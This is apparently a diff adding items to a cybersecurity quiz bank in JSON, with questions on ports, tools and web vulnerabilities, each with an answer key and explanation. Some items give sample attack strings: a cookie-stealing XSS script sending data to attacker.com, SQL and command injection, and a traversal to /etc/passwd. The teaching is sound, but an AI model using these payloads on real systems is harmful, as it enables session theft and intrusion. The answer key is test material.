@@ -706,5 +706,953 @@
         "correctAnswer": 1,
         "explanation": "A wallet drainer is malicious code or a smart contract designed to drain cryptocurrency funds from a victim's wallet, often by tricking users into approving malicious transactions.",
         "weight": 2
-    }
+    },
+    {
+        "question": "What does FTP stand for?",
+        "options": [
+            "File Transfer Protocol",
+            "Fast Transfer Process",
+            "Full Transfer Portal",
+            "Forensic Tracking Platform"
+        ],
+        "correctAnswer": 0,
+        "explanation": "FTP (File Transfer Protocol) is a standard network protocol used for transferring files between a client and server on a computer network. It operates on port 21 and is commonly used for uploading files to web servers.",
+        "weight": 1
+    },
+    {
+        "question": "What does SSH stand for?",
+        "options": [
+            "Server System Handler",
+            "Secure Socket Hub",
+            "Secure Shell",
+            "System Service Host"
+        ],
+        "correctAnswer": 2,
+        "explanation": "SSH (Secure Shell) is a cryptographic network protocol for operating network services securely over an unsecured network. It provides a secure channel over an unsecured network by using strong encryption and operates on port 22 by default.",
+        "weight": 1
+    },
+    {
+        "question": "What does RCE stand for in cybersecurity?",
+        "options": [
+            "Runtime Code Environment",
+            "Remote Code Execution",
+            "Root Certificate Error",
+            "Restricted Computing Environment"
+        ],
+        "correctAnswer": 1,
+        "explanation": "RCE (Remote Code Execution) is a critical vulnerability that allows an attacker to execute arbitrary code on a target machine remotely. This type of vulnerability gives attackers the ability to take control of the affected system.",
+        "weight": 1
+    },
+    {
+        "question": "What does LFI stand for?",
+        "options": [
+            "Linear File Integration",
+            "Live Framework Instance",
+            "Local File Inclusion",
+            "Logical Function Interface"
+        ],
+        "correctAnswer": 2,
+        "explanation": "LFI (Local File Inclusion) is a vulnerability that allows an attacker to include files on a server through the web browser. This vulnerability occurs when a web application includes a file without properly sanitizing the input, potentially allowing access to sensitive files on the server.",
+        "weight": 1
+    },
+    {
+        "question": "What does ACE stand for in the context of security vulnerabilities?",
+        "options": [
+            "Advanced Cryptographic Encryption",
+            "Authenticated Client Environment",
+            "Authorized Control Extension",
+            "Arbitrary Code Execution"
+        ],
+        "correctAnswer": 3,
+        "explanation": "ACE (Arbitrary Code Execution) refers to the ability of an attacker to execute arbitrary commands or code on a target machine. It's often the result of vulnerabilities like buffer overflows, format string vulnerabilities, or command injection flaws.",
+        "weight": 1
+    },
+    {
+        "question": "What port does IMAP typically use?",
+        "options": [
+            "Port 25",
+            "Port 110",
+            "Port 143",
+            "Port 443"
+        ],
+        "correctAnswer": 2,
+        "explanation": "IMAP (Internet Message Access Protocol) typically uses port 143 for unencrypted connections and port 993 for encrypted connections (IMAPS). IMAP allows email clients to access messages stored on a mail server.",
+        "weight": 1
+    },
+    {
+        "question": "What port does POP3 operate on?",
+        "options": [
+            "Port 110",
+            "Port 25",
+            "Port 143",
+            "Port 587"
+        ],
+        "correctAnswer": 0,
+        "explanation": "POP3 (Post Office Protocol version 3) operates on port 110 for unencrypted connections and port 995 for encrypted connections (POP3S). POP3 is used by email clients to download messages from a mail server to a local device.",
+        "weight": 1
+    },
+    {
+        "question": "What is DOM-based XSS?",
+        "options": [
+            "A server-side vulnerability that affects database queries",
+            "A client-side vulnerability where malicious script execution occurs in the Document Object Model",
+            "A network protocol vulnerability affecting domain controllers",
+            "A type of DDoS attack targeting domain name servers"
+        ],
+        "correctAnswer": 1,
+        "explanation": "DOM-based XSS (Cross-Site Scripting) is a client-side vulnerability where the attack payload is executed as a result of modifying the DOM environment in the victim's browser. The page itself doesn't change, but the client-side code contained in the page runs differently due to the malicious modifications to the DOM environment.",
+        "weight": 1
+    },
+    {
+        "question": "What distinguishes reflected XSS from stored XSS?",
+        "options": [
+            "Reflected XSS requires social engineering while stored XSS doesn't",
+            "Reflected XSS affects only mobile browsers while stored XSS affects all browsers",
+            "Reflected XSS occurs when the malicious script is reflected off a web server, while stored XSS occurs when the script is permanently stored on the target server",
+            "Reflected XSS targets only DOM elements while stored XSS targets server databases"
+        ],
+        "correctAnswer": 2,
+        "explanation": "Reflected XSS occurs when the malicious script is reflected off a web server (not permanently stored), typically from a request. Stored XSS (persistent XSS) occurs when the malicious script is permanently stored on the target server (e.g., in a database, message forum, comment field) and then retrieved by victims when they visit the affected page.",
+        "weight": 1
+    },
+    {
+        "question": "What is Hashcat primarily used for?",
+        "options": [
+            "Network scanning",
+            "Password cracking",
+            "Web application fuzzing",
+            "Traffic analysis"
+        ],
+        "correctAnswer": 1,
+        "explanation": "Hashcat is primarily used for password cracking. It's one of the fastest password recovery tools, supporting various hashing algorithms and attack types including dictionary attacks, brute force, rule-based attacks, and mask attacks.",
+        "weight": 1
+    },
+    {
+        "question": "What is SQLMap designed to do?",
+        "options": [
+            "Map network topology",
+            "Automate SQL injection detection and exploitation",
+            "Optimize SQL database performance",
+            "Create visual representations of database schemas"
+        ],
+        "correctAnswer": 1,
+        "explanation": "SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws. It features a powerful detection engine and many options for database fingerprinting, data fetching, and accessing the underlying file system.",
+        "weight": 1
+    },
+    {
+        "question": "What is enum4linux used for?",
+        "options": [
+            "Linux kernel enumeration",
+            "Enumerating information from Windows and Samba systems",
+            "Listing IPv4 network configurations",
+            "Counting database entries with 4-byte integers"
+        ],
+        "correctAnswer": 1,
+        "explanation": "enum4linux is a tool for enumerating information from Windows and Samba systems. It's written in Perl and can retrieve user lists, machine lists, share lists, domain/workgroup names, and password policy information from target systems.",
+        "weight": 1
+    },
+    {
+        "question": "What is the primary purpose of Binwalk?",
+        "options": [
+            "Network packet analysis",
+            "Binary firmware analysis and extraction",
+            "Web server vulnerability scanning",
+            "Password strength testing"
+        ],
+        "correctAnswer": 1,
+        "explanation": "Binwalk is a tool for analyzing, reverse engineering, and extracting firmware images. It's particularly useful for identifying embedded files and executable code within firmware images, making it valuable for IoT device analysis and security research.",
+        "weight": 1
+    },
+    {
+        "question": "What is subdomain takeover?",
+        "options": [
+            "The process of legally acquiring a company's subdomains",
+            "A vulnerability where an attacker can gain control of a subdomain when it points to a service that has been removed",
+            "A technique to increase SEO rankings by creating multiple subdomains",
+            "The administrative process of transferring subdomains to a new DNS provider"
+        ],
+        "correctAnswer": 1,
+        "explanation": "Subdomain takeover is a vulnerability that occurs when a subdomain (e.g., sub.example.com) points to a service (e.g., GitHub Pages, Heroku) that has been removed or deleted. Attackers can then claim the non-existent resource and effectively take control of the subdomain, potentially serving malicious content under the legitimate domain.",
+        "weight": 1
+    },
+    {
+        "question": "What is an open redirect vulnerability?",
+        "options": [
+            "A vulnerability allowing unauthenticated access to protected resources",
+            "A misconfiguration where a firewall allows all outbound connections",
+            "A flaw that permits attackers to redirect users to arbitrary external domains",
+            "A vulnerability where DNS records are publicly accessible"
+        ],
+        "correctAnswer": 2,
+        "explanation": "An open redirect vulnerability occurs when a web application accepts untrusted input that could cause it to redirect users to an arbitrary external domain. This can be exploited in phishing attacks where malicious links appear to come from trusted domains, increasing the likelihood that victims will click on them.",
+        "weight": 1
+    },
+    {
+        "question": "What type of attack is log poisoning?",
+        "options": [
+            "A social engineering attack targeting system administrators",
+            "A technique to corrupt system logs to hide intrusion evidence",
+            "An attack where malicious code is injected into log files and later executed",
+            "A denial of service attack that fills log files until disk space is exhausted"
+        ],
+        "correctAnswer": 2,
+        "explanation": "Log poisoning is an attack where an attacker injects malicious code into log files. If the application later processes these logs insecurely (e.g., through a vulnerable log viewer), the injected code may be executed. This is often used as part of a more complex attack chain, such as exploiting LFI vulnerabilities.",
+        "weight": 1
+    },
+    {
+        "question": "What distinguishes a SYN flood from other DDoS attacks?",
+        "options": [
+            "It targets application layer vulnerabilities rather than network resources",
+            "It exploits TCP's handshake process by sending numerous SYN packets without completing the handshake",
+            "It only affects systems using synchronous communication protocols",
+            "It requires significantly fewer attacking machines than other DDoS methods"
+        ],
+        "correctAnswer": 1,
+        "explanation": "A SYN flood is a type of DDoS attack that exploits the TCP three-way handshake process. The attacker sends numerous SYN packets to initiate connections but never completes the handshake (doesn't send ACK packets). This leaves connections in a half-open state, consuming server resources until legitimate connections can no longer be established.",
+        "weight": 1
+    },
+    {
+        "question": "What is SSRF (Server-Side Request Forgery)?",
+        "options": [
+            "A technique where attackers force the server to make requests to external systems",
+            "A vulnerability where server-side scripts are stolen and forged",
+            "A method to create fraudulent server responses",
+            "An attack that forces servers to restart frequently"
+        ],
+        "correctAnswer": 0,
+        "explanation": "SSRF (Server-Side Request Forgery) is a vulnerability where attackers can induce a server to make HTTP requests to an arbitrary domain of the attacker's choosing. This can leverage the server's privileged position to access internal services behind firewalls, scan internal networks, or interact with metadata services in cloud environments.",
+        "weight": 1
+    },
+    {
+        "question": "What is SSTI (Server-Side Template Injection)?",
+        "options": [
+            "A vulnerability in server temperature monitoring systems",
+            "An attack exploiting vulnerabilities in website templates",
+            "A technique where template engines are tricked into executing arbitrary code",
+            "A method for injecting malicious SQL into server-side scripts"
+        ],
+        "correctAnswer": 2,
+        "explanation": "SSTI (Server-Side Template Injection) is a vulnerability that occurs when user input is directly embedded into a template in an unsafe manner. Since templates are designed to generate dynamic content, this vulnerability can allow attackers to inject template directives that execute arbitrary code on the server, potentially leading to RCE.",
+        "weight": 1
+    },
+    {
+        "question": "What is XXE (XML External Entity) injection?",
+        "options": [
+            "A technique to inject extra XML elements into a document",
+            "A vulnerability where XML parsers process external entity references in untrusted XML data",
+            "A method for executing arbitrary XML extensions",
+            "A type of cross-site scripting specific to XML-based applications"
+        ],
+        "correctAnswer": 1,
+        "explanation": "XXE (XML External Entity) injection is a vulnerability that occurs when XML parsers process external entity references in untrusted XML input. Attackers can exploit this to disclose internal files, perform server-side request forgery, conduct port scanning, or execute remote code. It affects applications that parse XML from untrusted sources.",
+        "weight": 1
+    },
+    {
+        "question": "What is a deserialization attack?",
+        "options": [
+            "An attack that destroys serialized data in transit",
+            "An attack exploiting flaws in how applications convert serialized data back into objects",
+            "A technique to break serialization algorithms through brute force",
+            "A method to intercept serialized data between servers"
+        ],
+        "correctAnswer": 1,
+        "explanation": "A deserialization attack exploits vulnerabilities in how applications deserialize (convert serialized data back into objects) untrusted data. When applications deserialize data without proper validation, attackers can manipulate the serialized data to achieve various attacks including arbitrary code execution, denial of service, or authentication bypass.",
+        "weight": 1
+    },
+    {
+        "question": "What is prototype pollution in JavaScript?",
+        "options": [
+            "A technique to optimize JavaScript code by modifying prototypes",
+            "A vulnerability where attackers add or modify properties of Object.prototype",
+            "A method to prevent JavaScript frameworks from loading properly",
+            "A way to inject malicious code into prototype-based inheritance patterns"
+        ],
+        "correctAnswer": 1,
+        "explanation": "Prototype pollution is a JavaScript vulnerability where attackers can manipulate properties of the Object.prototype (the base object that all objects inherit from). By modifying this prototype, the attacker can affect all objects in the application, potentially leading to application logic corruption, DOM XSS, or in some cases remote code execution.",
+        "weight": 1
+    },
+    {
+        "question": "What is CRLF injection?",
+        "options": [
+            "A vulnerability in compiler code recognition",
+            "An attack inserting carriage return and line feed characters to manipulate HTTP responses",
+            "A technique for injecting malicious code into Linux file systems",
+            "A method to bypass form validation in web applications"
+        ],
+        "correctAnswer": 1,
+        "explanation": "CRLF (Carriage Return Line Feed) injection is a vulnerability where attackers can inject CR and LF characters (\\r\\n) into applications to manipulate HTTP responses. This can lead to HTTP response splitting, header injection, log forging, or in some cases, cross-site scripting attacks.",
+        "weight": 1
+    },
+    {
+        "question": "What is dangling markup injection?",
+        "options": [
+            "Injecting HTML tags that are never properly closed",
+            "A technique that leaves unused CSS markup in a webpage",
+            "An attack that creates unclosed HTML tags to steal data",
+            "Inserting deprecated HTML elements into modern websites"
+        ],
+        "correctAnswer": 2,
+        "explanation": "Dangling markup injection is an attack where malicious actors inject unclosed HTML tags into a webpage, causing the browser to treat the rest of the page content as part of the injected element. This can be used to steal sensitive data by having it sent to an attacker-controlled domain when the partial tag is eventually closed or completed.",
+        "weight": 1
+    },
+    {
+        "question": "What is NoSQL injection?",
+        "options": [
+            "A technique to bypass relational database security",
+            "An attack targeting databases that don't use SQL query language",
+            "A method to prevent SQL databases from functioning",
+            "Injecting null values into SQL databases"
+        ],
+        "correctAnswer": 1,
+        "explanation": "NoSQL injection is a vulnerability similar to SQL injection but targeting NoSQL databases like MongoDB, Cassandra, or CouchDB. Attackers manipulate query parameters to alter the logic of NoSQL queries, potentially bypassing authentication, extracting data, or modifying database contents.",
+        "weight": 1
+    },
+    {
+        "question": "What is LDAP injection?",
+        "options": [
+            "Loading directory access protocols into applications",
+            "A vulnerability where attackers manipulate LDAP queries through user input",
+            "Injecting lightweight data into application protocols",
+            "A technique for bypassing directory services"
+        ],
+        "correctAnswer": 1,
+        "explanation": "LDAP injection is a vulnerability where attackers can manipulate LDAP (Lightweight Directory Access Protocol) queries by injecting malicious input. This can allow unauthorized access to directory services, information disclosure about users and systems, or modification of directory content depending on the implementation.",
+        "weight": 1
+    },
+    {
+        "question": "What is ReDoS?",
+        "options": [
+            "Remote Denial of Service",
+            "Reduced Domain Security",
+            "Regular Expression Denial of Service",
+            "Recursive Document Structure"
+        ],
+        "correctAnswer": 2,
+        "explanation": "ReDoS (Regular Expression Denial of Service) is an attack that exploits the inefficient processing of certain regular expressions. By providing input that causes catastrophic backtracking in regex evaluation, attackers can cause excessive CPU consumption, effectively causing a denial of service condition.",
+        "weight": 1
+    },
+    {
+        "question": "What is XPath injection?",
+        "options": [
+            "A method to insert malicious code into XML path expressions",
+            "A vulnerability in cross-platform APIs",
+            "A technique to modify XML document paths",
+            "An attack targeting X.509 certificates"
+        ],
+        "correctAnswer": 0,
+        "explanation": "XPath injection is a vulnerability where attackers can manipulate XPath queries through user input. Since XPath is used to query XML documents, this attack can allow unauthorized access to sensitive data in XML files, bypass authentication mechanisms that use XML data stores, or extract the complete structure of XML documents.",
+        "weight": 1
+    },
+    {
+        "question": "What is clickjacking?",
+        "options": [
+            "A technique to hijack mouse clicks by intercepting DOM events",
+            "An attack where users are tricked into clicking on something different from what they perceive",
+            "A method to automatically generate clicks on advertisements",
+            "A vulnerability in mouse driver software"
+        ],
+        "correctAnswer": 1,
+        "explanation": "Clickjacking (UI redressing) is an attack where users are tricked into clicking on actionable content on a hidden website by overlaying it with content from another site. The user believes they are clicking on the visible page but are actually interacting with elements from the hidden page, potentially leading to unwanted actions or information disclosure.",
+        "weight": 1
+    },
+    {
+        "question": "What is a CSP bypass?",
+        "options": [
+            "Content Security Protocol bypass",
+            "Client-Side Processing bypass",
+            "Content Service Provider bypass",
+            "Content Security Policy bypass"
+        ],
+        "correctAnswer": 3,
+        "explanation": "A CSP (Content Security Policy) bypass refers to techniques that circumvent Content Security Policy protections. CSP is a security mechanism that helps prevent XSS and data injection attacks, but attackers may exploit misconfigurations, insecure sources, or browser bugs to bypass these restrictions and execute malicious scripts despite CSP being in place.",
+        "weight": 1
+    },
+    {
+        "question": "What is CORS misconfiguration?",
+        "options": [
+            "Incorrect cross-origin resource sharing settings that could lead to security vulnerabilities",
+            "A problem with core operating resource systems",
+            "Misconfigured client-side object request services",
+            "A type of DNS configuration error"
+        ],
+        "correctAnswer": 0,
+        "explanation": "CORS (Cross-Origin Resource Sharing) misconfiguration occurs when a server is set up with overly permissive cross-origin policies. This could allow malicious websites to make requests to the vulnerable server with the user's credentials, potentially leading to sensitive information disclosure, session hijacking, or other cross-domain attacks.",
+        "weight": 1
+    },
+    {
+        "question": "What is a race condition in cybersecurity?",
+        "options": [
+            "A competition between hackers to exploit a vulnerability first",
+            "A timing vulnerability where the outcome depends on the sequence of events",
+            "A condition where network packets race to reach their destination",
+            "A situation where multiple security systems compete for resources"
+        ],
+        "correctAnswer": 1,
+        "explanation": "A race condition is a timing vulnerability that occurs when multiple processes access and manipulate the same data concurrently, and the outcome depends on the precise sequence of operations. In security contexts, attackers can exploit race conditions to perform unauthorized actions, bypass security checks, or access restricted resources during the brief time window between a security check and the use of a resource.",
+        "weight": 1
+    },
+    {
+        "question": "What is rate limit bypassing?",
+        "options": [
+            "A technique to increase network bandwidth beyond ISP limits",
+            "Methods to circumvent restrictions on the number of requests allowed within a timeframe",
+            "Bypassing data transfer rate caps on cloud services",
+            "A way to accelerate packet transmission in congested networks"
+        ],
+        "correctAnswer": 1,
+        "explanation": "Rate limit bypassing refers to techniques used to circumvent restrictions on the number of requests a user can make to a service within a specific timeframe. Attackers may use multiple IP addresses, manipulate request headers, use proxies, or find implementation flaws to bypass these limits, enabling brute force attacks, enumeration, or denial of service.",
+        "weight": 1
+    },
+    {
+        "question": "What is API enumeration?",
+        "options": [
+            "The process of counting API calls in an application",
+            "A technique to discover and map out available API endpoints and functionality",
+            "Creating numbered versions of APIs for better tracking",
+            "A method to enumerate all possible API responses"
+        ],
+        "correctAnswer": 1,
+        "explanation": "API enumeration is the process of systematically discovering and mapping out available API endpoints, parameters, and functionality. Security researchers and attackers use this technique to understand the attack surface of an application, identify undocumented features, and potentially find vulnerabilities in the API implementation.",
+        "weight": 1
+    },
+    {
+        "question": "What is an account takeover via registration vulnerability?",
+        "options": [
+            "When attackers register accounts with similar names to impersonate legitimate users",
+            "A flaw allowing attackers to claim ownership of existing accounts during registration",
+            "When social engineering is used during registration to gain access to accounts",
+            "A vulnerability where registration data overwrites existing account information"
+        ],
+        "correctAnswer": 1,
+        "explanation": "Account takeover via registration vulnerability occurs when flaws in the registration process allow attackers to claim ownership of existing accounts. This might happen through email verification bypasses, case-sensitivity issues with usernames/emails, race conditions during registration, or other implementation flaws that fail to properly verify identity ownership.",
+        "weight": 1
+    },
+    {
+        "question": "What is email header injection?",
+        "options": [
+            "A technique where mail servers add tracking headers to emails",
+            "The process of adding metadata to email messages",
+            "A vulnerability allowing attackers to add custom headers to emails sent through vulnerable applications",
+            "An attack targeting email clients by exploiting header parsing bugs"
+        ],
+        "correctAnswer": 2,
+        "explanation": "Email header injection is a vulnerability where attackers can inject additional headers into emails sent through vulnerable applications. By inserting CRLF characters followed by additional headers, attackers can manipulate email content, add recipients (via BCC/CC), modify the subject line, or in some cases achieve more dangerous impacts like adding malicious attachments.",
+        "weight": 1
+    },
+    {
+        "question": "What are JWT vulnerabilities?",
+        "options": [
+            "Flaws in Java Web Toolkits",
+            "Security issues in JSON Web Tokens implementation or usage",
+            "Vulnerabilities in JavaScript Worker Threads",
+            "Bugs in web token generators"
+        ],
+        "correctAnswer": 1,
+        "explanation": "JWT (JSON Web Token) vulnerabilities refer to security issues in the implementation or usage of JWTs for authentication and session management. Common JWT vulnerabilities include weak signature verification (none algorithm attacks), token replay, weak secret keys, information disclosure in claims, and missing expiration checks.",
+        "weight": 1
+    },
+    {
+        "question": "What is PDF injection?",
+        "options": [
+            "Inserting malicious code into PDF documents",
+            "A technique to extract data from secured PDF files",
+            "Using PDF files as carriers for malware delivery",
+            "The process of dynamically generating PDF reports"
+        ],
+        "correctAnswer": 0,
+        "explanation": "PDF injection is a vulnerability where attackers can insert malicious content (like JavaScript code) into PDF documents. When these documents are opened by vulnerable PDF readers, the injected code can execute, potentially leading to information theft, system compromise, or other malicious activities.",
+        "weight": 1
+    },
+    {
+        "question": "What is OAuth vulnerability leading to account takeover?",
+        "options": [
+            "A configuration issue in OAuth servers",
+            "Flaws in the OAuth authentication flow that allow attackers to gain unauthorized access to accounts",
+            "When OAuth tokens are leaked through client-side storage",
+            "Vulnerabilities in open authentication frameworks"
+        ],
+        "correctAnswer": 1,
+        "explanation": "OAuth vulnerabilities leading to account takeover occur when flaws exist in the implementation of the OAuth authentication flow. These can include CSRF during authorization, improper validation of redirect URIs, token leakage through referrer headers, insecure storage of tokens, or failure to validate state parameters, allowing attackers to hijack authentication and gain unauthorized access to accounts.",
+        "weight": 1
+    },
+    {
+        "question": "What is SAML vulnerability?",
+        "options": [
+            "Security Assessment Markup Language flaws",
+            "System Authentication Module Leakage",
+            "Weaknesses in Security Assertion Markup Language implementations",
+            "Secure Access Management Loopholes"
+        ],
+        "correctAnswer": 2,
+        "explanation": "SAML (Security Assertion Markup Language) vulnerabilities are flaws in SAML implementations that can compromise the security of single sign-on systems. Common SAML vulnerabilities include XML signature wrapping attacks, insecure deserialization, DTD-based attacks, certificate validation issues, and logic flaws in the authentication flow.",
+        "weight": 1
+    },
+    {
+        "question": "What is Unicode normalization vulnerability?",
+        "options": [
+            "A flaw in how browsers display international text",
+            "When Unicode conversion exposes applications to security risks",
+            "A vulnerability in text encoding systems",
+            "Inconsistencies in how applications handle Unicode character representations"
+        ],
+        "correctAnswer": 3,
+        "explanation": "Unicode normalization vulnerabilities occur when applications inconsistently handle different representations of the same Unicode character. This can lead to security bypasses in authentication, authorization, input validation, or filename verification. For example, attackers might use visually similar characters (homoglyphs) or different Unicode representations of the same character to bypass security filters.",
+        "weight": 1
+    },
+    {
+        "question": "What is buffer overflow?",
+        "options": [
+            "When network buffers become congested with too much traffic",
+            "A vulnerability where data exceeds buffer boundaries and overwrites adjacent memory",
+            "When buffers in video processing overflow causing graphical glitches",
+            "A technique to overflow application logs with excessive data"
+        ],
+        "correctAnswer": 1,
+        "explanation": "Buffer overflow is a memory safety vulnerability that occurs when a program writes data beyond the boundaries of an allocated memory buffer, overwriting adjacent memory locations. This can lead to program crashes, data corruption, or most dangerously, arbitrary code execution if an attacker can control the content written beyond the buffer.",
+        "weight": 1
+    },
+    {
+        "question": "What is shared hosting server pivoting?",
+        "options": [
+            "Moving between different shared hosting providers",
+            "A technique where attackers compromise one website on a shared server to attack others",
+            "When hosting providers migrate websites between shared servers",
+            "A method to balance loads across multiple shared hosting environments"
+        ],
+        "correctAnswer": 1,
+        "explanation": "Shared hosting server pivoting is a technique where attackers compromise one website on a shared hosting server and then leverage that access to target other websites hosted on the same server. This is possible because shared hosting often has weak isolation between tenant accounts, allowing attackers to pivot laterally within the server environment.",
+        "weight": 1
+    },
+    {
+        "question": "What is HTML injection?",
+        "options": [
+            "A technique to inject HTML code into websites through vulnerable inputs",
+            "The process of dynamically adding HTML elements to web pages",
+            "A method for embedding HTML documents within each other",
+            "Inserting additional markup through developer tools"
+        ],
+        "correctAnswer": 0,
+        "explanation": "HTML injection is a vulnerability where attackers can insert arbitrary HTML code into a website through unsanitized user inputs. While less severe than XSS (as it doesn't necessarily involve JavaScript), HTML injection can still lead to content spoofing, phishing, UI manipulation, and in some cases when combined with other vulnerabilities, may enable cross-site scripting attacks.",
+        "weight": 1
+    },
+    {
+        "question": "What is DNS poisoning?",
+        "options": [
+            "When DNS servers become overloaded with requests",
+            "A technique to contaminate DNS cache with fraudulent records",
+            "Injecting malicious code into DNS server software",
+            "When ISPs deliberately corrupt DNS data"
+        ],
+        "correctAnswer": 1,
+        "explanation": "DNS poisoning (or DNS cache poisoning) is an attack where false information is introduced into a DNS resolver's cache, causing the name server to return an incorrect IP address. This redirects traffic to malicious websites even when users enter legitimate domain names, potentially leading to phishing, malware distribution, or man-in-the-middle attacks.",
+        "weight": 1
+    },
+    {
+        "question": "What is parameter fuzzing?",
+        "options": [
+            "Making web parameters harder to read through encryption",
+            "A testing technique that sends random or unexpected data to application inputs",
+            "The process of optimizing parameter values for performance",
+            "When parameters become corrupted during transmission"
+        ],
+        "correctAnswer": 1,
+        "explanation": "Parameter fuzzing is a testing technique where automated tools send random, unexpected, or malformed data to application input parameters. The goal is to identify security vulnerabilities, input validation flaws, injection points, or unexpected application behaviors that could be exploited by attackers.",
+        "weight": 1
+    },
+    {
+        "question": "What is a supply chain attack?",
+        "options": [
+            "Disrupting physical delivery of computing hardware",
+            "Attacking vendors to disrupt product availability",
+            "Compromising software or hardware before it reaches the end user",
+            "Exploiting vulnerabilities in inventory management systems"
+        ],
+        "correctAnswer": 2,
+        "explanation": "A supply chain attack occurs when attackers compromise software or hardware before it reaches the end user by targeting less-secure elements in the supply chain. This could involve compromising development tools, third-party libraries, update mechanisms, or even physical hardware during manufacturing or distribution. These attacks are particularly dangerous because they leverage trusted delivery channels.",
+        "weight": 1
+    },
+    {
+        "question": "What is 'living off the land' in cyber attacks?",
+        "options": [
+            "Using only locally-sourced computing resources",
+            "A technique where attackers use legitimate tools already installed on the target system",
+            "Exploiting agricultural IoT devices",
+            "Operating completely offline during attacks"
+        ],
+        "correctAnswer": 1,
+        "explanation": "Living off the land refers to a technique where attackers use legitimate tools and features already installed on the target system rather than introducing malicious software. This includes using PowerShell, WMI, Windows Management Instrumentation, built-in scripting capabilities, and system administration tools. This approach helps evade detection since it doesn't rely on introducing new, potentially flagged malware.",
+        "weight": 1
+    },
+    {
+"question": "Which of the following ports is commonly used for HTTP?",
+"options": [
+    "Port 21",
+    "Port 22",
+    "Port 80",
+    "Port 443"
+],
+"correctAnswer": 2,
+"explanation": "Port 80 is the standard port used for HTTP (Hypertext Transfer Protocol) traffic. This is the primary protocol for serving web pages on the internet. HTTPS, the secure version of HTTP, uses port 443.",
+"weight": 1
+},
+{
+"question": "Which port is commonly used for HTTPS?",
+"options": [
+    "Port 80",
+    "Port 443",
+    "Port 8080",
+    "Port 3389"
+],
+"correctAnswer": 1,
+"explanation": "Port 443 is the standard port used for HTTPS (HTTP Secure) traffic. HTTPS is the encrypted version of HTTP that provides secure communication over a computer network.",
+"weight": 1
+},
+{
+"question": "Which port is commonly used for MySQL database connections?",
+"options": [
+    "Port 1433",
+    "Port 3306",
+    "Port 5432",
+    "Port 8080"
+],
+"correctAnswer": 1,
+"explanation": "Port 3306 is the default port used for MySQL database connections. MySQL is a widely used open-source relational database management system.",
+"weight": 1
+},
+{
+"question": "Which port is commonly used for Microsoft SQL Server?",
+"options": [
+    "Port 1433",
+    "Port 3306",
+    "Port 5432",
+    "Port 27017"
+],
+"correctAnswer": 0,
+"explanation": "Port 1433 is the default port used for Microsoft SQL Server connections. This is Microsoft's enterprise database management system.",
+"weight": 1
+},
+{
+"question": "Which of the following is a correct example of a SQL injection attack?",
+"options": [
+    "document.getElementById('script').innerHTML = '<script>alert(\"XSS\")</script>'",
+    "username=admin&password=' OR '1'='1",
+    "<iframe src='javascript:alert(\"clickjacking\")'></iframe>",
+    "$user->set('role', 'admin')"
+],
+"correctAnswer": 1,
+"explanation": "The string 'username=admin&password=' OR '1'='1' is an example of a SQL injection attack. The injected SQL '1'='1' creates a condition that is always true, potentially bypassing authentication by making the WHERE clause in a query always evaluate to true.",
+"weight": 1
+},
+{
+"question": "Which of the following is a correct example of a Cross-Site Scripting (XSS) payload?",
+"options": [
+    "' OR 1=1 --",
+    "admin' AND 1=0 UNION SELECT username, password FROM users--",
+    "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
+    "ping -c 4 127.0.0.1; cat /etc/passwd"
+],
+"correctAnswer": 2,
+"explanation": "The payload '<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>' is an example of a Cross-Site Scripting (XSS) attack. This JavaScript code redirects the victim to the attacker's site while appending the victim's cookies, potentially allowing session hijacking.",
+"weight": 1
+},
+{
+"question": "Which of the following tools is specifically designed for WordPress vulnerability scanning?",
+"options": [
+    "Nmap",
+    "WPScan",
+    "Metasploit",
+    "Burp Suite"
+],
+"correctAnswer": 1,
+"explanation": "WPScan is a black box WordPress vulnerability scanner specifically designed to identify security issues in WordPress installations, including vulnerable plugins, themes, and WordPress core vulnerabilities.",
+"weight": 1
+},
+{
+"question": "Which Nmap scan option is used to determine which ports are open on a target?",
+"options": [
+    "nmap -sV target",
+    "nmap -sP target",
+    "nmap -sS target",
+    "nmap -O target"
+],
+"correctAnswer": 2,
+"explanation": "The nmap -sS option performs a SYN scan (also known as half-open scan or stealth scan) which is used to determine which ports are open on a target. It sends SYN packets and analyzes the responses to identify open, closed, or filtered ports.",
+"weight": 1
+},
+{
+"question": "Which of the following is a correct example of a command injection attack?",
+"options": [
+    "<script>alert('XSS')</script>",
+    "' OR 1=1 --",
+    "ping 8.8.8.8; cat /etc/passwd",
+    "../../etc/passwd"
+],
+"correctAnswer": 2,
+"explanation": "The command 'ping 8.8.8.8; cat /etc/passwd' is an example of a command injection attack. The semicolon (;) is used to chain commands together, allowing an attacker to execute an unauthorized command (cat /etc/passwd) after a legitimate command (ping 8.8.8.8).",
+"weight": 1
+},
+{
+"question": "Which of the following is an example of a Local File Inclusion (LFI) attack?",
+"options": [
+    "http://example.com/page.php?file=../../../etc/passwd",
+    "http://example.com/login.php?username=admin'--",
+    "http://example.com/search?q=<script>alert('XSS')</script>",
+    "http://example.com/api/users?role=admin"
+],
+"correctAnswer": 0,
+"explanation": "The URL 'http://example.com/page.php?file=../../../etc/passwd' is an example of a Local File Inclusion (LFI) attack. The '../../../' is directory traversal syntax used to navigate to the root directory, potentially allowing an attacker to access sensitive system files like /etc/passwd.",
+"weight": 1
+},
+{
+"question": "Which of the following HTTP headers helps prevent clickjacking attacks?",
+"options": [
+    "X-XSS-Protection",
+    "X-Frame-Options",
+    "Content-Security-Policy",
+    "X-Content-Type-Options"
+],
+"correctAnswer": 1,
+"explanation": "The X-Frame-Options HTTP header helps prevent clickjacking attacks by instructing the browser whether the content can be displayed within frames. Values like 'DENY' or 'SAMEORIGIN' control whether the page can be framed, preventing malicious sites from embedding your content.",
+"weight": 1
+},
+{
+"question": "Which of the following is a correct regular expression that is vulnerable to ReDoS?",
+"options": [
+    "^[a-zA-Z0-9]+$",
+"\\d{4}-\\d{2}-\\d{2}",
+    "^(a+)+$",
+    "^[^<>]$"
+],
+"correctAnswer": 2,
+"explanation": "The regular expression '^(a+)+ is vulnerable to ReDoS (Regular Expression Denial of Service). The nested repetition quantifiers (a+ followed by another +) can cause catastrophic backtracking when processing certain inputs, potentially leading to extremely high CPU usage or system unresponsiveness.",
+"weight": 1
+},
+{
+"question": "Which of the following is an example of a DOM-based XSS vulnerability?",
+"options": [
+    "Server-side code that inserts user input directly into the response HTML",
+    "Client-side JavaScript that takes data from the URL and inserts it into the DOM using innerHTML",
+    "A SQL query that uses user input without parameterization",
+    "A server that sets cookies without the HttpOnly flag"
+],
